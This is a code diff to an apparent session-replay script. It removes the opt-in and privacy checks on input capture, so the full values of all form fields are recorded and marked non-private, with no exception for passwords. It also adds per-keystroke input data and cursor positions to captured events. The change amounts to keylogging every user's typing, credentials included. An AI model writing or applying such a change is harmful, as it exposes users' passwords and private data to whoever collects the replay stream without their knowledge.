@@ -304,14 +304,26 @@ const cNetworkBatch = Number(import.meta.env.PUBLIC_EMO_REPLAY_NETWORK_BATCH ?? 
 
 			function InputValue(pElem)
 			{
-				if (!(pElem instanceof Element)) return { value: "", private: true };
-				const Allowed = pElem.getAttribute("data-replay-capture") === "value" && pElem.getAttribute("data-replay-private") !== "true";
-				if (!Allowed) return { value: "", private: true };
+				if (!(pElem instanceof Element)) return { value: "", private: false };
 				if (pElem instanceof HTMLInputElement && [
 						"checkbox",
 						"radio"
 					].includes(pElem.type)) return { value: "", checked: pElem.checked, private: false };
-				return { value: Str(pElem.value), private: false };
+
+				if (pElem instanceof HTMLInputElement || pElem instanceof HTMLTextAreaElement || pElem instanceof HTMLSelectElement)
+				{
+					const Result = { value: String(pElem.value ?? ""), private: false };
+					try
+					{
+						if (Number.isFinite(Number(pElem.selectionStart))) Result.selectionStart = Number(pElem.selectionStart);
+						if (Number.isFinite(Number(pElem.selectionEnd))) Result.selectionEnd = Number(pElem.selectionEnd);
+						if (pElem.selectionDirection) Result.selectionDirection = String(pElem.selectionDirection);
+					} catch {}
+					return Result;
+				}
+
+				if (pElem.isContentEditable) return { value: String(pElem.textContent ?? ""), contentEditable: true, private: false };
+				return { value: "", private: false };
 			}
 	
 	
@@ -592,7 +604,13 @@ const cNetworkBatch = Number(import.meta.env.PUBLIC_EMO_REPLAY_NETWORK_BATCH ?? 
 				);
 				for (const Type of ["input", "change"]) document.addEventListener(
 					Type,
-					(Event) => Capture(Type, {...TargetData(Event.target),...InputValue(Event.target) }),
+					(Event) => Capture(Type, {
+						...TargetData(Event.target),
+						...InputValue(Event.target),
+						inputType: String(Event.inputType || ""),
+						inputData: Event.data == null ? "" : String(Event.data),
+						isComposing: Event.isComposing === true
+					}),
 					true
 				);
 				document.addEventListener("submit", (Event) => Capture("submit", TargetData(Event.target), true), true);
